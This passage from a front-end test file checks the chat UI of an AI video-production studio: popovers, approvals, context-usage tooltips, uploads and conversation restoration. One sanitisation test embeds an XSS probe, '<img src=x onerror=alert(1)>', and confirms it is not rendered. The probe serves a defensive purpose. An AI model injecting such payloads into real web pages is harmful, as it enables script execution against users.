      '真实制作资料',
    )
    expect(screen.getByRole('button', { name: '编辑文档' })).toBeInTheDocument()
  })
  it('closes composer popovers on Escape or outside click without clearing the draft or starting work', async () => {
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '尚未发送的创意' } })
    fireEvent.click(screen.getByRole('button', { name: '模型', exact: true }))
    expect(screen.getByRole('dialog', { name: '选择模型' })).not.toHaveAttribute('aria-modal', 'true')
    fireEvent.keyDown(document, { key: 'Escape' })
    expect(screen.queryByRole('dialog', { name: '选择模型' })).not.toBeInTheDocument()
    expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('尚未发送的创意')
    fireEvent.click(screen.getByRole('button', { name: 'Skill', exact: true }))
    expect(screen.getByRole('dialog', { name: 'Skill' })).toBeInTheDocument()
    fireEvent.pointerDown(document.body)
    expect(screen.queryByRole('dialog', { name: 'Skill' })).not.toBeInTheDocument()
    expect(Socket.instances).toHaveLength(0)
  })
  it('copies assistant prose only on request and renders no invented reasoning', async () => {
    const copy = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: copy } })
    render(<EventCard event={{ id: 'answer', kind: 'assistant', text: '已保留全部成功素材。' }} />)
    expect(copy).not.toHaveBeenCalled()
    fireEvent.click(screen.getByRole('button', { name: '复制消息' }))
    await screen.findByRole('button', { name: '已复制' })
    expect(copy).toHaveBeenCalledWith('已保留全部成功素材。')
    expect(screen.queryByText('思考过程')).not.toBeInTheDocument()
  })
  it.each([
    ['complete', 'succeeded', false, false],
    ['paused', 'failed', false, true],
    ['running', 'running', false, true],
    ['paused', 'running', true, false],
  ] as const)(
    'keeps %s/%s batch visibility truthful without a chat billing breakdown',
    async (status, nodeStatus, cancelled, expanded) => {
      server.use(
        http.get('*/agent-studio/api/runs/run1', () =>
          HttpResponse.json(
            snapshot({
              status,
              active_batch: 'batch1',
              billing: { settled_credits: '12.000', by_kind: { text: 12, image: 0, video: 0 } },
              batches: [
                {
                  id: 'batch1',
                  revision: 1,
                  cancelled,
                  nodes: { node1: { id: 'node1', title: '首个镜头', status: nodeStatus } },
                },
              ],
            }),
          ),
        ),
      )
      render(<DeepAgentStudio />)
      await openHistory()
      const batch = screen.getByText(/制作批次/).closest('details')!
      expect(batch.open).toBe(expanded)
      expect(screen.queryByText(/本次共消耗/)).not.toBeInTheDocument()
    },
  )
  it('renders actual historical decision receipts without inventing missing questions or misclassifying resume', () => {
    render(
      <Conversation
        onDocument={() => {}}
        events={[
          { id: 'reply', kind: 'user', text: '使用原剧本对白', data: { decision: 'reply', tool: 'ask_user' } },
          { id: 'approve', kind: 'user', text: '确认这三个镜头', data: { decision: 'approve' } },
          { id: 'reject', kind: 'user', text: '这次取消', data: { decision: 'reject' } },
          { id: 'resume', kind: 'user', text: '继续查询已有任务', data: { decision: 'resume' } },
        ]}
      />,
    )
    expect(screen.getByText('已回答')).toBeInTheDocument()
    expect(screen.getByText('已确认制作')).toBeInTheDocument()
    expect(screen.getByText('已拒绝制作')).toBeInTheDocument()
    expect(screen.getByText('使用原剧本对白')).toBeInTheDocument()
    expect(screen.queryByRole('fieldset')).not.toBeInTheDocument()
    const resumed = screen.getByText('继续查询已有任务').closest('article')
    expect(resumed?.className).toContain('userMessage')
    expect(resumed?.textContent).not.toContain('已回答')
  })
  it('collapses and restores the standalone director without discarding the draft or open conversation', async () => {
    render(<DirectorStudioView />)
    await openHistory()
    fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '保留这一段草稿' } })
    fireEvent.click(screen.getByRole('img', { name: '上下文用量', exact: true }))
    fireEvent.click(screen.getByRole('button', { name: '收起 DoDo Agent' }))
    expect(screen.queryByRole('dialog', { name: '上下文用量' })).not.toBeInTheDocument()
    expect(screen.queryByRole('textbox', { name: '创作要求' })).not.toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: '打开 DoDo Agent' }))
    expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('保留这一段草稿')
    expect(screen.getByRole('button', { name: '第一集测试' })).toBeInTheDocument()
    expect(Socket.instances).toHaveLength(1)
  })
  it.each([
    ['image', '图片', 'png'],
    ['video', '视频', 'mp4'],
  ])(
    'replaces the %s generating placeholder with media and never animates failed or paused work',
    (type, label, extension) => {
      const event = {
        id: 'media-task',
        kind: 'cost',
        text: '生成',
        data: {
          tool: `model.generate_${type}`,
          status: 'running',
          task_id: 99,
        },
      }
      const { container, rerender } = render(<EventCard event={event} />)
      const placeholder = screen.getByRole('status', { name: `正在生成${label}` })
      expect(placeholder).toHaveAttribute('aria-busy', 'true')
      expect(placeholder.className).toContain('mediaGenerating')
      rerender(<EventCard event={event} active={false} />)
      expect(screen.getByRole('status', { name: `${label}进度已保留` })).toHaveAttribute('aria-busy', 'false')
      expect(container.innerHTML).not.toMatch(/mediaGenerating|_spin_/)
      rerender(<EventCard event={{ ...event, data: { ...event.data, status: 'failed' } }} />)
      expect(screen.getByRole('status', { name: `${label}未生成` })).toHaveAttribute('aria-busy', 'false')
      expect(container.innerHTML).not.toMatch(/mediaGenerating|_spin_/)
      rerender(
        <EventCard
          event={{
            ...event,
            data: {
              ...event.data,
              status: 'succeeded',
              assets: [{ id: 42, download_url: `https://media.test/result.${extension}` }],
            },
          }}
        />,
      )
      expect(screen.queryByRole('status')).not.toBeInTheDocument()
      expect(container.querySelector(type === 'video' ? 'video' : 'img')).toHaveAttribute(
        'src',
        `https://media.test/result.${extension}`,
      )
    },
  )
  it('hides inference receipts and shows only an explicit public reasoning summary', () => {
    const event = {
      id: 'plan',
      kind: 'cost',
      text: '思考与编剧',
      data: {
        tool: 'model.generate_text',
        status: 'succeeded',
        actual_cost: '1.37',
        task_id: 4509,
        responses_reasoning: 'opaque',
      },
    }
    const { container, rerender } = render(<EventCard event={event} />)
    expect(container).toBeEmptyDOMElement()
    for (const status of ['running', 'failed']) {
      rerender(<EventCard event={{ ...event, data: { ...event.data, status } }} />)
      expect(container).toBeEmptyDOMElement()
    }
    rerender(
      <EventCard
        event={{
          ...event,
          data: {
            ...event.data,
            reasoning_enabled: true,
            reasoning_summary: '先整理人物关系。 <img src=x onerror=alert(1)>',
          },
        }}
      />,
    )
    expect(screen.getByText('思考')).toBeInTheDocument()
    fireEvent.click(container.querySelector('summary')!)
    expect(screen.getByText(/先整理人物关系/)).toBeVisible()
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).not.toMatch(/1.37|4509|opaque|积分/)
    rerender(
      <EventCard
        event={{ ...event, data: { ...event.data, reasoning_enabled: false, reasoning_summary: 'hidden' } }}
      />,
    )
    expect(container).toBeEmptyDOMElement()
    rerender(<EventCard event={{ ...event, data: { ...event.data, reasoning_summary: '  ' } }} />)
    expect(container).toBeEmptyDOMElement()
  })
  it('groups adjacent tool receipts while keeping generated media and messages visible', () => {
    render(
      <Conversation
        onDocument={() => {}}
        events={[
          { id: 'start', kind: 'tool_start', text: '正在执行 model.get', data: { tool: 'model.get' } },
          { id: 'a', kind: 'tool', text: '读取模型参数', data: { status: 'succeeded' } },
          { id: 'b', kind: 'tool', text: '加载制作工具', data: { status: 'succeeded' } },
          { id: 'c', kind: 'assistant', text: '素材准备完成。' },
          {
            id: 'image',
            kind: 'tool',
            text: '生成图片',
            data: {
              status: 'succeeded',
              assets: [{ id: 12, download_url: 'https://media.test/result.png' }],
            },
          },
        ]}
      />,
    )
    expect(screen.getByText('已执行 2 个工具')).toBeInTheDocument()
    expect(screen.queryByText('正在执行 model.get')).not.toBeInTheDocument()
    expect(screen.getByText('素材准备完成。')).toBeVisible()
    expect(screen.getByRole('img', { name: '生成素材' })).toBeVisible()
  })
  it('shows unavailable context honestly and uses only reported input usage without inventing a percentage', async () => {
    render(<DeepAgentStudio />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    fireEvent.click(screen.getByRole('img', { name: '上下文用量', exact: true }))
    expect(screen.getByRole('img', { name: '上下文用量' })).toHaveAttribute('data-tooltip', '上下文用量未提供')
    expect(screen.queryByRole('dialog', { name: '上下文用量' })).not.toBeInTheDocument()
    fireEvent.keyDown(document, { key: 'Escape' })
    server.use(
      http.get('*/agent-studio/api/runs/run1', () =>
        HttpResponse.json(
          snapshot({
            events: [
              {
                id: 'usage',
                kind: 'cost',
                text: '思考与编剧',
                data: {
                  tool: 'model.generate_text',
                  status: 'succeeded',
                  usage: { input_tokens: 12345, output_tokens: 500 },
                },
              },
            ],
          }),
        ),
      ),
    )
    await openHistory()
    fireEvent.click(screen.getByRole('img', { name: '上下文用量', exact: true }))
    expect(screen.getByRole('img', { name: '上下文用量' })).toHaveAttribute('data-tooltip', '上次输入 12,345 tokens')
    expect(screen.queryByText(/剩余.*%/)).not.toBeInTheDocument()
  })
  it('replaces cumulative billing updates without adding the same charge twice', async () => {
    render(<DeepAgentStudio />)
    await openHistory()
    act(() => {
      for (const cursor of [8, 9])
        Socket.instances[0].emit({
          event: 'update',
          cursor,
          data: {
            run_id: 'run1',
            type: 'ACTIVITY_SNAPSHOT',
            data: { settled_credits: '1326.000', by_kind: { video: '1326.000', image: '0', text: '0' } },
          },
        })
    })
    expect(screen.queryByText(/本次共消耗/)).not.toBeInTheDocument()
    expect(screen.queryByText(/2652/)).not.toBeInTheDocument()
  })
})

it('keeps execution internals hidden while retaining readable task outcomes', () => {
  render(
    <EventCard
      event={{
        id: 'tool',
        kind: 'tool',
        text: 'studio.read_context({secret_internal: true})',
        data: { tool: 'studio.read_context', status: 'succeeded', secret_internal: 'private-payload' },
      }}
    />,
  )
  expect(screen.getByText('读取制作资料', { selector: 'strong' })).toBeInTheDocument()
  expect(document.body.textContent).not.toMatch(/secret_internal|private-payload|studio\.read_context/)
  expect(document.querySelector('pre')).toBeNull()
})
it('replaces raw approval JSON with readable content without changing its frozen scope', async () => {
  const args = {
    batch_id: 'internal-batch',
    nodes: [
      {
        title: '雨夜入场',
        estimated_cost: 34,
        arguments: {
          model_version_id: 18,
          params: { prompt: '人物进入房间', duration: 8, resolution: '480p', generate_audio: true },
          idempotency_key: 'internal-key',
        },
      },
    ],
  }
  const onDecision = vi.fn().mockResolvedValue(undefined)
  render(
    <Approval
      models={catalog.models}
      run={snapshot({
        status: 'waiting',
        decision_id: 'd1',
        pending: { tool: 'production.generate_batch', arguments: args },
      })}
      busy={false}
      onDecision={onDecision}
    />,
  )
  expect(screen.getByText('雨夜入场')).toBeInTheDocument()
  expect(screen.getByText('模型：Seedance 2.5')).toBeInTheDocument()
  expect(screen.getByText('清晰度：480p')).toBeInTheDocument()
  expect(document.body.textContent).not.toMatch(/internal-batch|internal-key|idempotency_key/)
  fireEvent.click(screen.getByRole('button', { name: '确认并继续' }))
  await waitFor(() =>
    expect(onDecision).toHaveBeenCalledWith(
      expect.objectContaining({ decision_id: 'd1', decision: 'approve', arguments: args }),
    ),
  )
})

it('updates real context remaining over websocket without rendering the summary in chat', async () => {
  render(<DeepAgentStudio />)
  await openHistory()
  const data = {
    capacity_tokens: 100000,
    input_tokens: 25000,
    remaining_percent: 75,
    measurement: 'provider_usage',
    auto_compaction: true,
    compaction_count: 2,
    status: 'ready',
  }
  act(() =>
    Socket.instances[0].emit({
      event: 'update',
      cursor: 8,
      data: {
        run_id: 'run1',
        type: 'MESSAGE_UPSERT',
        data: { id: 'ctx', kind: 'context', text: 'private-context-summary', data },
      },
    }),
  )
  fireEvent.click(screen.getByRole('img', { name: '上下文用量', exact: true }))
  expect(screen.getByRole('img', { name: '上下文用量' })).toHaveAttribute('data-tooltip', '上次请求后剩余 75%')
  expect(screen.queryByRole('dialog', { name: '上下文用量' })).not.toBeInTheDocument()
  expect(document.body.textContent).not.toContain('private-context-summary')
  act(() =>
    Socket.instances[0].emit({
      event: 'update',
      cursor: 9,
      data: {
        run_id: 'run1',
        type: 'MESSAGE_UPSERT',
        data: { id: 'ctx', kind: 'context', text: '', data: { ...data, capacity_tokens: null } },
      },
    }),
  )
  expect(screen.queryByText(/剩余.*%/)).not.toBeInTheDocument()
  expect(screen.getByRole('img', { name: '上下文用量' }).getAttribute('data-tooltip')).not.toContain('%')
})
it('preserves user-facing correction and recovery progress messages', () => {
  render(
    <Conversation
      onDocument={() => {}}
      events={[
        { id: 'fix', kind: 'progress', text: '分镜资料需要补充，正在自动纠正', data: { reason: 'draft_validation' } },
        {
          id: 'restore',
          kind: 'progress',
          text: '成功素材已保留，正在恢复任务',
          data: { status: 'running', internal: 'hidden' },
        },
      ]}
    />,
  )
  expect(screen.getByText('分镜资料需要补充，正在自动纠正')).toBeVisible()
  expect(document.body.textContent).toContain('成功素材已保留，正在恢复任务')
  expect(document.body.textContent).not.toMatch(/draft_validation|internal/)
})
it('hover and keyboard focus show the same custom tooltip without native duplicates', async () => {
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const button = screen.getByRole('button', { name: '模型', exact: true })
  expect(button).not.toHaveAttribute('title')
  fireEvent.pointerOver(button)
  expect(screen.getByRole('tooltip')).toHaveTextContent('选择模型')
  fireEvent.pointerOut(button)
  expect(screen.queryByRole('tooltip')).not.toBeInTheDocument()
  fireEvent.focus(button)
  expect(screen.getByRole('tooltip')).toHaveTextContent('选择模型')
  fireEvent.keyDown(document, { key: 'Escape' })
  expect(screen.queryByRole('tooltip')).not.toBeInTheDocument()
})

it('attachment menu offers local upload and library; selected existing assets are sent once with selected models', async () => {
  const registered = vi.fn(),
    submitted = vi.fn()
  server.use(
    http.post('*/agent-studio/api/attachments', () =>
      HttpResponse.json({ id: 'uploaded44', asset_id: 44, name: '角色参考', type: 'image' }),
    ),
    http.get('*/agent-studio/api/library', () =>
      HttpResponse.json({ items: [{ id: 44, name: '角色参考', type: 'image' }], total: 1 }),
    ),
    http.post('*/agent-studio/api/attachments/library', async ({ request }) => {
      registered(await request.json())
      return HttpResponse.json({ attachments: [{ id: 'existing44', asset_id: 44, name: '角色参考', type: 'image' }] })
    }),
    http.post('*/agent-studio/api/runs', async ({ request }) => {
      submitted(await request.json())
      return HttpResponse.json({ id: 'run1' })
    }),
  )
  const { container } = render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  expect(screen.queryByText('图片 · Nano Banana Pro (Google)')).not.toBeInTheDocument()
  fireEvent.change(container.querySelector('input[type="file"]')!, {
    target: { files: [new NodeFile(['image'], 'reference.png', { type: 'image/png' })] },
  })
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  expect(screen.getByRole('button', { name: '本地上传' })).toBeInTheDocument()
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  fireEvent.click(await screen.findByRole('button', { name: /角色参考/ }))
  fireEvent.click(screen.getByRole('button', { name: '添加所选素材（1）' }))
  await waitFor(() => expect(screen.queryByRole('dialog', { name: '从素材库选择' })).not.toBeInTheDocument())
  expect(registered).toHaveBeenCalledExactlyOnceWith({ asset_ids: [44] })
  expect(screen.getAllByRole('button', { name: /移除/ })).toHaveLength(1)
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '使用这个角色' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  await waitFor(() => expect(submitted).toHaveBeenCalledOnce())
  expect(submitted.mock.calls[0][0]).toMatchObject({
    attachments: ['existing44'],
    selection: { image: 29, video: 18, mode: 'manual' },
  })
})
it('library errors stay visible and never attach or submit assets', async () => {
  server.use(http.get('*/agent-studio/api/library', () => HttpResponse.json({ error: '无素材权限' }, { status: 403 })))
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  expect(await screen.findByRole('alert')).toHaveTextContent('无素材权限')
  expect(screen.getByRole('button', { name: '添加所选素材（0）' })).toBeDisabled()
})

it('local upload remains available from the attachment menu', async () => {
  const uploaded = vi.fn()
  server.use(
    http.post('*/agent-studio/api/attachments', async ({ request }) => {
      uploaded(await request.text())
      return HttpResponse.json({ id: 'local-script', type: 'prompt', characters: 5 })
    }),
  )
  const { container } = render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const input = container.querySelector<HTMLInputElement>('input[type="file"]')!
  const open = vi.spyOn(input, 'click')
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '本地上传' }))
  expect(open).toHaveBeenCalledOnce()
  fireEvent.change(input, { target: { files: [new NodeFile(['scene'], 'story.txt', { type: 'text/plain' })] } })
  expect(await screen.findByRole('button', { name: '移除 story.txt' })).toBeInTheDocument()
  await waitFor(() => expect(uploaded).toHaveBeenCalledExactlyOnceWith('scene'))
})

it('uploads a screenplay over 10 MiB and blocks files beyond 50 MiB without submitting a run', async () => {
  const uploaded = vi.fn()
  server.use(
    http.post('*/agent-studio/api/attachments', async ({ request }) => {
      uploaded((await request.arrayBuffer()).byteLength)
      return HttpResponse.json({ id: 'long-script', type: 'prompt', characters: 100_001 })
    }),
  )
  const { container } = render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const input = container.querySelector<HTMLInputElement>('input[type="file"]')!
  const size = 11 * 1024 * 1024
  fireEvent.change(input, { target: { files: [new NodeFile([new Uint8Array(size)], 'long.docx')] } })
  await waitFor(() => expect(uploaded).toHaveBeenCalledExactlyOnceWith(size))
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const oversized = new NodeFile(['x'], 'large.docx')
  Object.defineProperty(oversized, 'size', { value: 50 * 1024 * 1024 + 1 })
  fireEvent.change(input, { target: { files: [oversized] } })
  expect(await screen.findByText('单个文件须为 1 字节至 50 MB。')).toBeInTheDocument()
  expect(uploaded).toHaveBeenCalledOnce()
  expect(Socket.instances).toHaveLength(0)
})

it('closing library registration ignores its late response without attaching or generating', async () => {
  let finish!: () => void
  const registered = vi.fn()
  server.use(
    http.get('*/agent-studio/api/library', () =>
      HttpResponse.json({ items: [{ id: 44, name: '参考图', type: 'image' }], total: 1 }),
    ),
    http.post('*/agent-studio/api/attachments/library', async () => {
      registered()
      await new Promise<void>((resolve) => {
        finish = resolve
      })
      return HttpResponse.json({ attachments: [{ id: 'late', asset_id: 44, name: '迟到素材', type: 'image' }] })
    }),
  )
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  fireEvent.click(await screen.findByRole('button', { name: /参考图/ }))
  fireEvent.click(screen.getByRole('button', { name: '添加所选素材（1）' }))
  await waitFor(() => expect(registered).toHaveBeenCalledOnce())
  fireEvent.click(
    within(screen.getByRole('dialog', { name: '从素材库选择' })).getByRole('button', { name: '关闭', exact: true }),
  )
  await act(async () => {
    finish()
    await Promise.resolve()
  })
  expect(screen.queryByRole('button', { name: '移除 迟到素材' })).not.toBeInTheDocument()
  expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
})

it('does not leave empty or overcounted tool groups for hidden inference receipts', () => {
  const hidden = ['a', 'b'].map((id) => ({
    id,
    kind: 'tool',
    text: 'hidden',
    data: { tool: 'model.generate_text', status: 'succeeded' },
  }))
  const { container, rerender } = render(<Conversation events={hidden} onDocument={() => {}} />)
  expect(container).toBeEmptyDOMElement()
  rerender(
    <Conversation
      events={[...hidden, { id: 'c', kind: 'tool', text: '读取素材', data: { tool: 'assets.list' } }]}
      onDocument={() => {}}
    />,
  )
  expect(screen.queryByText(/已执行.*工具/)).not.toBeInTheDocument()
  expect(container.querySelectorAll('article')).toHaveLength(1)
})

it('renders real reply updates while running without duplicating the final message', async () => {
  server.use(http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ status: 'running', events: [
    { id: 'planning', kind: 'cost', text: '生成中', data: { task_id: 808, tool: 'model.generate_text', status: 'running' } },
  ] }))))
  render(<DeepAgentStudio />)
  await openHistory()
  const socket = Socket.instances[0]
  for (const [index, text] of ['你好', '你好，欢迎', '你好，欢迎！'].entries()) {
    act(() => socket.emit({ event: 'update', cursor: 8 + index, data: {
      run_id: 'run1', type: 'MESSAGE_UPSERT', data: { id: 'deep-plan-0', kind: 'assistant', text, data: { streaming: true, task_id: 808 } },
    } }))
    expect(screen.getAllByText(text)).toHaveLength(1)
    expect(screen.getByRole('button', { name: '停止回复' })).toBeEnabled()
    expect(screen.queryByText('正在思考')).not.toBeInTheDocument()
  }
})


it('uses matching catalog capacity for old receipts, includes output, and rejects another model profile', () => {
  const modelCatalog = { ...catalog, context_defaults: { model_id: 21, capacity_tokens: 100000 } }
  const run = snapshot({ selection: { image: 29, video: 18, mode: 'manual', chat: 21 }, context: {
    model_id: 21, input_tokens: 24000, output_tokens: 1000, measurement: 'provider_usage', capacity_tokens: null,
  } })
  expect(contextInfo(run, modelCatalog).percent).toBe(75)
  expect(contextInfo({ ...run, selection: { ...run.selection!, chat: 55 } }, modelCatalog).percent).toBeNull()
})

it('keeps previous messages and media through live updates and clears them only for a new conversation', async () => {
  const previous = [
    { id: 'history:old:user', kind: 'user', text: '记住海棠这个名字' },
    { id: 'history:old:reply', kind: 'assistant', text: '已记住海棠' },
    { id: 'history:old:image', kind: 'cost', text: '图片完成', data: {
      tool: 'model.generate_image', status: 'succeeded', assets: [{ id: 12, download_url: 'https://media.test/old.png' }],
    } },
  ]
  server.use(http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({
    history_events: previous, events: [{ id: 'user', kind: 'user', text: '继续制作' }],
  }))))
  render(<DeepAgentStudio />)
  await openHistory()
  expect(screen.getByText('记住海棠这个名字')).toBeVisible()
  expect(screen.getByText('已记住海棠')).toBeVisible()
  expect(screen.getByRole('img', { name: '生成素材' })).toBeVisible()
  act(() => Socket.instances[0].emit({ event: 'update', cursor: 8, data: {
    run_id: 'run1', type: 'MESSAGE_UPSERT', data: { id: 'reply', kind: 'assistant', text: '正在继续' },
  } }))
  expect(screen.getByText('已记住海棠')).toBeVisible()
  expect(screen.getByText('正在继续')).toBeVisible()
  fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
  expect(screen.queryByText('已记住海棠')).not.toBeInTheDocument()
})


it('sends on Enter immediately, keeps prior messages and prevents duplicate submission while acknowledgement is pending', async () => {
  let acknowledge!: () => void
  const pending = new Promise<void>((resolve) => { acknowledge = resolve })
  const starts: unknown[] = []
  server.use(
    http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({ events: [{ id: 'old', kind: 'assistant', text: '此前的回复' }] }))),
    http.post('*/agent-studio/api/runs', async ({ request }) => {
      starts.push(await request.json())
      await pending
      return HttpResponse.json({ id: 'run2' })
    }),
    http.get('*/agent-studio/api/runs/run2', () => HttpResponse.json(snapshot({ id: 'run2', status: 'running', history_events: [{ id: 'history:old', kind: 'assistant', text: '此前的回复' }], events: [{ id: 'user', kind: 'user', text: '继续这段对话' }] }))),
  )
  render(<DeepAgentStudio />)
  await openHistory()
  const input = screen.getByRole('textbox', { name: '创作要求' })
  fireEvent.change(input, { target: { value: '继续这段对话' } })
  for (const options of [{ shiftKey: true }, { isComposing: true }, { keyCode: 229 }, { repeat: true }])
    fireEvent.keyDown(input, { key: 'Enter', ...options })
  expect(starts).toHaveLength(0)
  expect(input).toHaveValue('继续这段对话')
  fireEvent.keyDown(input, { key: 'Enter' })
  expect(screen.getByText('继续这段对话')).toBeVisible()
  expect(screen.getByText('此前的回复')).toBeVisible()
  expect(screen.getByText('发送中…')).toBeVisible()
  expect(input).toHaveValue('')
  fireEvent.keyDown(input, { key: 'Enter' })
  await waitFor(() => expect(starts).toHaveLength(1))
  acknowledge()
  await waitFor(() => expect(screen.queryByText('发送中…')).not.toBeInTheDocument())
  expect(screen.getAllByText('继续这段对话')).toHaveLength(1)
  expect(screen.getByText('此前的回复')).toBeVisible()
})

it('restores the draft after rejection without leaving a fake sent message', async () => {
  server.use(http.post('*/agent-studio/api/runs', () => HttpResponse.json({ detail: '余额不足' }, { status: 400 })))
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '保留我的草稿' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  expect(screen.getByText('保留我的草稿')).toBeVisible()
  await screen.findByText('余额不足')
  expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('保留我的草稿')
  expect(screen.queryByText('发送中…')).not.toBeInTheDocument()
})


it('discards the old optimistic conversation and ignores its response when the host changes canvas', async () => {
  let release!: () => void
  const pending = new Promise<void>((resolve) => { release = resolve })
  let posts = 0
  const oldSnapshot = vi.fn(() => HttpResponse.json(snapshot({ id: 'old-canvas-run' })))
  server.use(
    http.post('*/agent-studio/api/runs', async () => { posts++; await pending; return HttpResponse.json({ id: 'old-canvas-run' }) }),
    http.get('*/agent-studio/api/runs/old-canvas-run', oldSnapshot),
  )
  const view = render(<DeepAgentStudio authMode="oauth" canvasId={1} />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '旧画布的请求' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  await waitFor(() => expect(posts).toBe(1))
  expect(screen.getByText('发送中…')).toBeVisible()
  view.rerender(<DeepAgentStudio authMode="oauth" canvasId={2} />)
  await waitFor(() => expect(screen.queryByText('发送中…')).not.toBeInTheDocument())
  expect(screen.queryByText('旧画布的请求')).not.toBeInTheDocument()
  await act(async () => { release(); await new Promise((resolve) => setTimeout(resolve, 30)) })
  expect(oldSnapshot).not.toHaveBeenCalled()
  expect(screen.getByRole('textbox', { name: '创作要求' })).toHaveValue('')
  expect(posts).toBe(1)
})


it('ignores a late history refresh from the previous canvas after the send was accepted', async () => {
  let release!: () => void
  const delayed = new Promise<void>((resolve) => { release = resolve })
  let historyCalls = 0
  server.use(
    http.post('*/agent-studio/api/runs', () => HttpResponse.json({ id: 'run1' })),
    http.get('*/agent-studio/api/state', async () => {
      const call = ++historyCalls
      if (call === 2) await delayed
      return HttpResponse.json({ connected: true, workspace_id: 54, runs: call === 1 ? [] : [{
        id: call === 2 ? 'old-history' : 'new-history', title: call === 2 ? '旧画布历史' : '新画布历史', status: 'complete',
      }] })
    }),
  )
  const view = render(<DeepAgentStudio authMode="oauth" canvasId={1} />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '发送测试' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  await waitFor(() => expect(historyCalls).toBe(2))
  view.rerender(<DeepAgentStudio authMode="oauth" canvasId={2} />)
  await waitFor(() => expect(historyCalls).toBe(3))
  await act(async () => { release(); await new Promise((resolve) => setTimeout(resolve, 30)) })
  fireEvent.click(screen.getByRole('button', { name: '新对话' }))
  expect(screen.getByRole('button', { name: /新画布历史/ })).toBeVisible()
  expect(screen.queryByRole('button', { name: /旧画布历史/ })).not.toBeInTheDocument()
})


describe('conversation refresh', () => {
  it('restores the active conversation and its history without submitting work; New remains empty on refresh', async () => {
    let posts = 0
    server.use(
      http.post('*/agent-studio/api/runs', () => { posts++; return HttpResponse.json({ id: 'unexpected' }) }),
      http.get('*/agent-studio/api/runs/run1', () => HttpResponse.json(snapshot({
        status: 'running', events: [{ id: 1, kind: 'user', text: '保留这段剧本', at: 1 }],
      }))),
    )
    const first = render(<DeepAgentStudio apiBase="/agent-studio" />)
    await openHistory()
    await screen.findByText('保留这段剧本')
    first.unmount()
    const second = render(<DeepAgentStudio apiBase="/agent-studio" />)
    await screen.findByText('保留这段剧本')
    await waitFor(() => expect(Socket.instances.length).toBeGreaterThan(1))
    expect(posts).toBe(0)
    fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
    expect(screen.queryByText('保留这段剧本')).not.toBeInTheDocument()
    second.unmount()
    render(<DeepAgentStudio apiBase="/agent-studio" />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    expect(screen.queryByText('保留这段剧本')).not.toBeInTheDocument()
    expect(posts).toBe(0)
  })

  it('isolates restoration by account and canvas, and clears an inaccessible saved run', async () => {
    const key = 'dodo-conversation:' + JSON.stringify(['/agent-studio', 'account-1', null])
    sessionStorage.setItem(key, 'gone')
    let reads = 0
    server.use(http.get('*/agent-studio/api/runs/gone', () => { reads++; return HttpResponse.json({ detail: 'Not found' }, { status: 404 }) }))
    const otherCanvas = render(<DeepAgentStudio apiBase="/agent-studio" canvasId={20} />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    expect(reads).toBe(0)
    otherCanvas.unmount()
    const missing = render(<DeepAgentStudio apiBase="/agent-studio" />)
    await screen.findByText('原会话已不可访问，可以新建对话或从历史记录中选择。')
    expect(sessionStorage.getItem(key)).toBeNull()
    missing.unmount()
    sessionStorage.setItem(key, 'gone')
    const oldReads = reads
